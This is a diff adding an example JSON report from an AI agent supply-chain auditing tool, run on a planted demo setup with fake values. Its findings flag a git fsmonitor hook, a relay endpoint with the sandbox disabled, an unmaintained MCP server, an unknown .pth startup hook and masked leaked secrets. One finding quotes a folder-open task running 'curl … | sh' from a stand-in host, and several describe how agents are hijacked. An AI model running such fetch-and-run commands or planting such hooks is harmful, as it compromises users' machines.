@@ -1,0 +1,226 @@
+{
+  "tool": "agent-supply-chain-auditor",
+  "version": "0.5.0",
+  "generated_at": "2000-01-01T00:00:00Z",
+  "result": "FAIL",
+  "fail_on": "high",
+  "targets": {
+    "mcp_client_configs": [
+      "/home/demo/.claude/settings.json",
+      "/home/demo/.codex/config.toml",
+      "/home/demo/.config/Claude/claude_desktop_config.json",
+      "/home/demo/.config/Code/User/mcp.json"
+    ],
+    "repo_roots": [
+      "/home/demo/work"
+    ],
+    "session_history": [
+      "/home/demo/.claude/projects"
+    ],
+    "instruction_dirs": [
+      "/home/demo/Desktop",
+      "/home/demo/Downloads"
+    ],
+    "python_sites": [
+      "/home/demo/work/take-home/.venv/lib/python3.12/site-packages"
+    ],
+    "global_git_configs": [
+      "/home/demo/.gitconfig"
+    ]
+  },
+  "stats": {
+    "plugin_checkouts": 0,
+    "mcp_servers": 2,
+    "git_repos": 1,
+    "agent_allowlist_files": 1,
+    "session_history_files": 1,
+    "session_history_bytes": 121,
+    "session_history_secrets": 1,
+    "session_history_truncated_files": 0,
+    "stray_instruction_files": 0,
+    "agent_endpoints": 1,
+    "user_hooks": 0,
+    "python_sites": 1,
+    "python_dists": 0,
+    "python_pth_targets": 1,
+    "dev_credential_files": 0,
+    "user_autostart_entries": 0,
+    "system_autostart_entries": 0,
+    "ai_stack_dirs": 18,
+    "ai_stack_files": 0,
+    "ai_stack_findings": 0,
+    "remediation_guarded": 0
+  },
+  "counts": {
+    "critical": 1,
+    "high": 7,
+    "medium": 3,
+    "low": 0,
+    "info": 1,
+    "suppressed": 0
+  },
+  "findings": [
+    {
+      "rule": "git.fsmonitor",
+      "category": "repo-config",
+      "severity": "critical",
+      "title": "core.fsmonitor names a program git runs on every index refresh",
+      "location": "/home/demo/work/take-home/.git/config:3",
+      "subject": "core.fsmonitor",
+      "detail": "Any `git status`/`git diff` — including the ones agents run silently to orient themselves — executes this command with your privileges (GitSpawn; CVE-2026-71963 Hermes Agent, CVE-2026-19592 Codex, CVE-2026-72718 goose). Value: `echo asca-demo-never-runs` (scope: repo).",
+      "remediation": "If you did not set this yourself, treat the repo as hostile: do not open it in an agent. Remove it without running git in the repo (edit .git/config by hand) or `git config --unset core.fsmonitor` from a safe shell. Upgrade agents to patched versions.",
+      "suppressed": false,
+      "suppress_reason": "",
+      "fingerprint": "cddd60bdf0dccc62"
+    },
+    {
+      "rule": "agent.relay-pattern",
+      "category": "agent-config",
+      "severity": "high",
+      "title": "Codex looks reconfigured by a relay: endpoint override plus unsafe sandbox/approvals",
+      "location": "/home/demo/.codex/config.toml#model_providers.cheap.base_url",
+      "subject": "Codex:relay-pattern",
+      "detail": "This is the combination Symantec observed (https://www.security.com/threat-intelligence/openai-claude-unauthorized-relays). Files: /home/demo/.codex/config.toml#model_providers.cheap.base_url, /home/demo/.codex/config.toml#sandbox_mode.",
+      "remediation": "If you didn't set this up on purpose, restore the vendor defaults (delete the override), log out and back in to the CLI, rotate the API key/token it used, and check how the change got there (a one-line 'setup' script from a reseller is the known pattern).",
+      "suppressed": false,
+      "suppress_reason": "",
+      "fingerprint": "3c5319ee8afd7fb1"
+    },
+    {
+      "rule": "agent.sandbox-disabled",
+      "category": "agent-config",
+      "severity": "high",
+      "title": "Codex: sandbox_mode = \"danger-full-access\" (top level)",
+      "location": "/home/demo/.codex/config.toml#sandbox_mode",
+      "subject": "Codex:sandbox_mode = \"danger-full-access\" (top level)",
+      "detail": "With the sandbox or approvals off, anything the model decides to run executes with your full user rights, including whatever a prompt injection or a malicious endpoint tells it to.",
+      "remediation": "Use the vendor default (Codex `workspace-write`, Claude Code `default` permissions, Hermes `smart` approvals). Keep full access to throwaway containers, and accept it in the baseline there.",
+      "suppressed": false,
+      "suppress_reason": "",
+      "fingerprint": "b5fee9d7bd9cef90"
+    },
+    {
+      "rule": "mcp.archived-server",
+      "category": "pinning",
+      "severity": "high",
+      "title": "MCP server `browser` runs an archived package that will never be patched",
+      "location": "/home/demo/.config/Code/User/mcp.json#servers.browser",
+      "subject": "browser:@modelcontextprotocol/server-puppeteer",
+      "detail": "`@modelcontextprotocol/server-puppeteer` is unmaintained: no security fixes or releases will come. Listed in https://github.com/modelcontextprotocol/servers-archived. A prompt injection can make it start any process instead of the browser (Glow Labs, MCPhantom); the maintainers closed the report as out of scope and won't fix it. Pinning a version doesn't help here, because no fixed version will ever exist. Coding agents still pick these names from their training data (Glow Labs, MCPhantom: https://www.glow.io/blogs/mcphantom-ai-coding-agents-are-installing-vulnerable-deprecated-mcp-servers-from-training-data).",
+      "remediation": "Remove this server from the config and use Microsoft's maintained Playwright server, `@playwright/mcp` instead. Tell your agent to check a server's maintenance status before installing one.",
+      "suppressed": false,
+      "suppress_reason": "",
+      "fingerprint": "e31a371eaecbe868"
+    },
+    {
+      "rule": "pin.mcp-package",
+      "category": "pinning",
+      "severity": "high",
+      "title": "MCP server `files` runs an unpinned package",
+      "location": "/home/demo/.config/Claude/claude_desktop_config.json#mcpServers.files",
+      "subject": "files:@modelcontextprotocol/server-filesystem",
+      "detail": "`@modelcontextprotocol/server-filesystem` — npx fetches the latest matching release from the npm registry on each start; a hijacked maintainer account or typosquat ships straight into your agent. MCP servers run with your agent's privileges and see its tool traffic.",
+      "remediation": "Pin an exact, reviewed version: `@modelcontextprotocol/server-filesystem@<exact-version>`.",
+      "suppressed": false,
+      "suppress_reason": "",
+      "fingerprint": "0d6f99f9d7487b4a"
+    },
+    {
+      "rule": "python.executable-pth",
+      "category": "python-startup",
+      "severity": "high",
+      "title": "demo_boot.pth runs code at every Python start (venv /home/demo/work/take-home/.venv)",
+      "location": "/home/demo/work/take-home/.venv/lib/python3.12/site-packages/demo_boot.pth",
+      "subject": "/home/demo/work/take-home/.venv/lib/python3.12/site-packages:demo_boot.pth:17",
+      "detail": "No installed package claims this file (not in any RECORD), so pip didn't put it there. First line: `import demo_boot`",
+      "remediation": "If you can't explain it: Don't run Python in that environment until you know where this came from (pip itself would run it). Delete the environment and rebuild it from a pinned lockfile; if the hook ran, rotate every credential the user can read (cloud, SSH, agent .env, browser).",
+      "suppressed": false,
+      "suppress_reason": "",
+      "fingerprint": "6e951e084ddfeb60"
+    },
+    {
+      "rule": "repo.agent-hook",
+      "category": "repo",
+      "severity": "high",
+      "title": "VS Code/Cursor task \"setup\" on folder open runs a command (local to this checkout (not committed))",
+      "location": "/home/demo/work/take-home/.vscode/tasks.json#tasks[0]",
+      "subject": "tasks[0]:2efe868c42e7",
+      "detail": "`curl -s https://example.invalid/setup.sh | sh`. This file is local to this checkout (not committed). It uses `curl`, which is how hooks fetch or send data.",
+      "remediation": "Read the command (and any script it calls) before opening this repo with the agent. Remove the hook if you don't need it. Hooks you wrote yourself can be accepted in the baseline; a changed command gets a new fingerprint and is reported again.",
+      "suppressed": false,
+      "suppress_reason": "",
+      "fingerprint": "74327f82534bd96c"
+    },
+    {
+      "rule": "secret.session-history",
+      "category": "secrets",
+      "severity": "high",
+      "title": "Anthropic API key saved in agent session history",
+      "location": "/home/demo/.claude/projects",
+      "subject": "Anthropic API key:9b44d4fe8369",
+      "detail": "sk-a… (len=57, sha256:9b44d4fe) appears 1 time(s) in 1 transcript file(s) (Claude Code transcripts). Examples: /home/demo/.claude/projects/demo-project/session.jsonl:1. Usually the agent's own tool output (it read a .env or printed a config); any later skill or agent that reads past sessions gets the key.",
+      "remediation": "Rotate the key now: moving it out of .env (or deleting the file the agent read) does not remove the copies already saved in transcripts. Then delete or redact the old transcripts that contain it, restrict their permissions (chmod 700 on the history directory), and shorten the agent's history/transcript retention or disable persistence where the agent offers a setting. Steps: Anthropic: create a new key and delete this one at https://console.anthropic.com/settings/keys, then check Usage for spend you don't recognise.",
+      "suppressed": false,
+      "suppress_reason": "",
+      "fingerprint": "b5c52056be968b3a"
+    },
+    {
+      "rule": "agent.endpoint-override",
+      "category": "agent-config",
+      "severity": "medium",
+      "title": "Codex uses a non-default model endpoint (relay.example.invalid)",
+      "location": "/home/demo/.codex/config.toml#model_providers.cheap.base_url",
+      "subject": "Codex:model_providers.cheap:relay.example.invalid",
+      "detail": "`model_providers.cheap` = `relay.example.invalid`. Whoever runs this endpoint sees everything the agent sends and chooses what it gets back, which is enough to steer a coding agent (HiddenLayer, 'Man-in-the-Model').",
+      "remediation": "Fine if it's your company gateway or a provider you chose; accept it in the baseline. Otherwise remove the override and rotate the key it used.",
+      "suppressed": false,
+      "suppress_reason": "",
+      "fingerprint": "25d2fce6403c655c"
+    },
+    {
+      "rule": "python.pth-import-target",
+      "category": "python-startup",
+      "severity": "medium",
+      "title": "Startup module nobody installed: demo_boot.pth → demo_boot.py (venv /home/demo/work/take-home/.venv)",
+      "location": "/home/demo/work/take-home/.venv/lib/python3.12/site-packages/demo_boot.py",
+      "subject": "/home/demo/work/take-home/.venv/lib/python3.12/site-packages:demo_boot.py:Startup module nobody installed",
+      "detail": "No installed package lists it in RECORD. `demo_boot.pth` imports it at every Python start, pip included.",
+      "remediation": "Don't run Python in that environment until you know where this came from (pip itself would run it). Delete the environment and rebuild it from a pinned lockfile; if the hook ran, rotate every credential the user can read (cloud, SSH, agent .env, browser).",
+      "suppressed": false,
+      "suppress_reason": "",
+      "fingerprint": "66030a3cb6cc60c3"
+    },
+    {
+      "rule": "secret.agent-allowlist",
+      "category": "secrets",
+      "severity": "medium",
+      "title": "Database password in a command (local or private host) saved in a Claude Code allow rule",
+      "location": "/home/demo/.claude/settings.json#permissions.allow[1]",
+      "subject": "Database password in a command (local or private host):asca… (len=20, sha256:6031139e)",
+      "detail": "`Bash(PGPASSWORD=asca… (len=20, sha256:6031139e) psql -h db.example.invalid -U app:*)`. Claude Code saved this command verbatim when it was approved, and it's re-sent to the model in every session that loads these settings. The host looks local or private, but the password still works for anyone on that network.",
+      "remediation": "1) Rotate the credential first: removing it doesn't clear git history, forks or clones. 2) If the file is committed: `git rm --cached .claude/settings.local.json` and add `.claude/settings.local.json` to the repo's .gitignore. 3) Delete the rule (or the auto-approve entry). 4) Keep secrets in environment variables and use `$VAR` in commands, so the saved rule holds no secret. 5) Approve patterns like `Bash(npm run:*)` instead of literal commands.",
+      "suppressed": false,
+      "suppress_reason": "",
+      "fingerprint": "233e3e0f55d862e5"
+    },
+    {
+      "rule": "mcp.launcher-dep-drift",
+      "category": "mcp",
+      "severity": "info",
+      "title": "MCP server `browser` is pinned to @modelcontextprotocol/server-puppeteer 0.6.2, but its dependencies aren't",
+      "location": "/home/demo/.config/Code/User/mcp.json#servers.browser",
+      "subject": "browser:npm:@modelcontextprotocol/server-puppeteer@0.6.2",
+      "detail": "`npx` resolves the server's dependencies again from the registry whenever it rebuilds its cache, within whatever ranges the package allows. Corelight saw one MCP server pinned to one release run with 15 different dependency sets over 19 builds in five weeks. A malicious dependency release only has to be live during one rebuild.",
+      "remediation": "Freeze it: run the server from a local install from the package's lockfile (`npm ci` in a dedicated folder) or a container image pinned by digest, and point the agent config at that. Someone then owns updates on purpose.",
+      "suppressed": false,
+      "suppress_reason": "",
+      "fingerprint": "075f732009987fa5"
+    }
+  ],
+  "demo": {
+    "asca_version": "0.5.0",
+    "fixed": false,
+    "note": "Real asca output for the planted `asca demo` setup. All values are fake (asca-demo markers); paths are rewritten to /home/demo.",
+    "regenerate": "python3 -m asca demo --write-reports examples (Linux, Python 3.11+)"
+  }
+}
